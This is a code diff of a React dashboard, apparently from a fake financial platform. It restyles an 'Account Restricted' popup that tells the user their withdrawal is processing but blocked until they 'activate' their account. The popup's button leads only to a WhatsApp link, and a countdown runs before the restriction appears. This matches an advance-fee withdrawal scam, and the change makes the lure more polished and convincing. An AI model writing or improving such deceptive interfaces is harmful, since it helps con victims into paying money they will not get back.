@@ -177,26 +177,38 @@ export default function Dashboard(){
     <Layout>
       <LogoHeader />
 
-      {/* ===== ADDED: Restriction popup (non-invasive) ===== */}
+      {/* ===== ADDED: Restriction popup (centered, blur background) ===== */}
       {restricted && (
-        <div className="introOverlay" role="dialog" aria-modal="true" style={{zIndex:9999}}>
-          <div className="introBox card">
-            <div style={{fontWeight:800,fontSize:18,marginBottom:8}}>
+        <div
+          role="dialog"
+          aria-modal="true"
+          style={{
+            position: 'fixed',
+            inset: 0,
+            backgroundColor: 'rgba(0,0,0,0.45)',
+            backdropFilter: 'blur(6px)',
+            WebkitBackdropFilter: 'blur(6px)',
+            display: 'flex',
+            justifyContent: 'center',
+            alignItems: 'center',
+            zIndex: 9999
+          }}
+        >
+          <div className="introBox card" style={{ maxWidth: 420, width: '92%', textAlign: 'center', padding: 20 }}>
+            <div style={{ fontWeight: 800, fontSize: 18, marginBottom: 12 }}>
               Account Restricted ⚠️
             </div>
 
-            <div className="small muted" style={{lineHeight:1.6}}>
+            <div className="small muted" style={{ lineHeight: 1.6, marginBottom: 16 }}>
               Dear <strong>{user.fullName}</strong>, your withdrawal is processing.
               Due to a temporary account restriction, you are required to activate
               your account before the withdrawal can be successfully sent to your bank account.
             </div>
 
-            <div style={{height:16}} />
-
             <button
               className="btn"
-              style={{width:'100%', fontWeight:800}}
-              onClick={()=>{
+              style={{ width: '100%', fontWeight: 800 }}
+              onClick={() => {
                 window.location.href = WHATSAPP_LINK;
               }}
             >
@@ -205,7 +217,7 @@ export default function Dashboard(){
           </div>
         </div>
       )}
-      {/* =================================================== */}
+      {/* ================================================================ */}
 
       {/* ===== ADDED: show countdown when active and not yet restricted ===== */}
       {timeLeft > 0 && !restricted && (
